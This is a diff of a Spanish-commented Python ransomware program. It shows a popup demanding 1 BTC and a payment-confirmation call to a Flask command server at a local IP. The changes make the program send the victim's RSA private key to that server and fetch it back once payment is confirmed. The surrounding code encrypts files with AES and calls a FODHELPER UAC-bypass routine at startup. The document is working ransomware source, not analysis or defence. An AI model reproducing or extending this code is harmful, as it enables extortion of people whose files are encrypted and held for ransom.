@@ -14,6 +14,7 @@ import tkinter as tk
 from tkinter import messagebox, ttk
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.padding import PKCS7
 import sys
@@ -37,41 +38,34 @@ def show_payment_popup(directories, sk):
     label = tk.Label(popup, text="¿Has realizado el pago de 1 BTC?", font=("Helvetica", 12))
     label.pack(pady=10)
     
-    def confirm_payment(directories, sk):
+    def confirm_payment(directories):
         # Lógica de comunicación con el servidor Flask para confirmar el pago
         try:
-            url = "http://192.168.1.140:5000/confirm_payment"
+            url = "http://192.168.1.137:5000/confirm_payment"
+            payload = json.dumps({"payment_confirmed": True})
+            headers = {'Content-Type': 'application/json'}
 
-            payload = json.dumps({
-                "payment_confirmed": True,
-            })
-
-            headers = {
-                'Content-Type': 'application/json',
-            }
-
-            # Aquí corregimos la URL a la que el servidor espera la solicitud
             response = requests.request("POST", url, headers=headers, data=payload)
 
             if response.status_code == 200:
-                revertirCambios(directories,sk)
-                messagebox.showinfo("Éxito", "Pago confirmado, los archivos han sido desencriptados.")
+                # Recuperar la clave privada del servidor
+                sk_response = requests.get("http://192.168.1.137:5000/get_private_key")  
+                if sk_response.status_code == 200:
+                    private_key_pem = sk_response.json().get("private_key")
+                    sk = serialization.load_pem_private_key(private_key_pem.encode(), password=None)  # Convertir la clave PEM a un objeto clave privada
+                    revertirCambios(directories, sk)
+                    messagebox.showinfo("Éxito", "Pago confirmado, los archivos han sido desencriptados.")
             else:
-                # Si la respuesta no es exitosa, mostramos un mensaje de error
                 messagebox.showerror("Error", "No se pudo confirmar el pago.")
         except requests.exceptions.RequestException as e:
-            # Si hay algún error en la conexión o en la solicitud
             print(f"Error al contactar el servidor: {e}")
             messagebox.showerror("Error", "Hubo un problema al contactar el servidor.")
         
-        # Cerrar el popup después de la confirmación
         popup.destroy()
 
-    # Botón de confirmación del pago
-    pay_button = tk.Button(popup, text="Pagar", command=lambda: confirm_payment(directories, sk), font=("Helvetica", 12), fg="white", bg="green")
+    pay_button = tk.Button(popup, text="Pagar", command=lambda: confirm_payment(directories), font=("Helvetica", 12), fg="white", bg="green")
     pay_button.pack(pady=20)
 
-    # Botón para cancelar
     cancel_button = tk.Button(popup, text="Cancelar", command=popup.destroy, font=("Helvetica", 12), fg="white", bg="red")
     cancel_button.pack()
 
@@ -179,10 +173,6 @@ def play_alarm():
     except Exception as e:
         print(f"Error al reproducir el sonido: {e}")
 
-def generatePairKeys():
-    sk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
-    pk = sk.public_key()
-    return sk, pk
 
 def encryptFile(filePath, pk):
     aesK = os.urandom(32) 
@@ -394,6 +384,74 @@ def revertirCambios(directories,sk):
    
 def runClient():
     app.run(host="0.0.0.0", port=5001)
+
+
+def getStoredPublicKey():
+    """
+    Intenta recuperar la clave pública almacenada en el servidor.
+    """
+    try:
+        response = requests.get("http://192.168.1.137:5000/get_key")
+        if response.status_code == 200:
+            public_key_pem = response.json().get("public_key")
+            if public_key_pem:
+                # Convertir la clave pública desde PEM a objeto
+                public_key = serialization.load_pem_public_key(public_key_pem.encode())
+                print("Clave pública obtenida del servidor.")
+                return public_key
+        print("No se encontró una clave pública en el servidor.")
+    except Exception as e:
+        print(f"Error al comunicarse con el servidor: {e}")
+    return None
+
+
+def generatePairKeys():
+    """
+    Genera un par de claves RSA y envía tanto la clave pública como la clave privada al servidor.
+    """
+    # Intenta recuperar la clave pública almacenada
+    stored_public_key = getStoredPublicKey()
+    if stored_public_key:
+        return None, stored_public_key  # No generamos nuevas claves si ya existen
+
+    # Generar nuevo par de claves
+    sk = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048
+    )
+
+    pk = sk.public_key()
+
+    # Serializar la clave pública y privada para enviar al servidor
+    public_key_pem = pk.public_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo
+    )
+
+    private_key_pem = sk.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption()
+    )
+
+    # Enviar la clave pública y privada al servidor
+    try:
+        response = requests.post(
+            "http://192.168.1.137:5000/store_key",
+            json={
+                "public_key": public_key_pem.decode(),
+                "private_key": private_key_pem.decode() 
+            }
+        )
+        if response.status_code == 200:
+            print("Claves pública y privada almacenadas en el servidor.")
+        else:
+            print(f"Error al almacenar las claves: {response.text}")
+    except Exception as e:
+        print(f"Error al comunicarse con el servidor: {e}")
+
+    return sk, pk
+
 
 def main():
     runAsAdminFODHELPER()
